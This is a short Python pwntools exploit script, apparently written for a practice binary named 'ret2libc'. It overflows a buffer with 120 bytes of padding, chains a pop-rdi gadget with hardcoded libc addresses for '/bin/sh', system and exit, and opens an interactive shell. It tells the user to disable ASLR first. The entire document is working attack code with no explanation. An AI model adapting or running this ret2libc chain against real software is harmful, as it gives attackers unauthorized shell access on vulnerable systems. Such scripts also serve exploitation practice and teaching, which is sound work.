from pwn import *

print "[!!!] Remember to set ASLR to 0 [!!!]"

# p = remote('127.0.0.1', 9999)
p = process('./ret2libc')

base = 0x00007ffff7ded000 
offset_binsh = 0x181519 
binsh = base + offset_binsh
system = 0x7ffff7e319c0
exit = 0x7ffff7e26ea0

padding = 'A'*120
rdi = p64(0x00005555555551eb)  # pop rdi, ret
sh = p64(binsh)
sys = p64(system)
exi = p64(exit)

# print padding + rdi + sh + sys + exi 

p.sendline(padding + rdi + sh + sys + exi)

p.interactive()
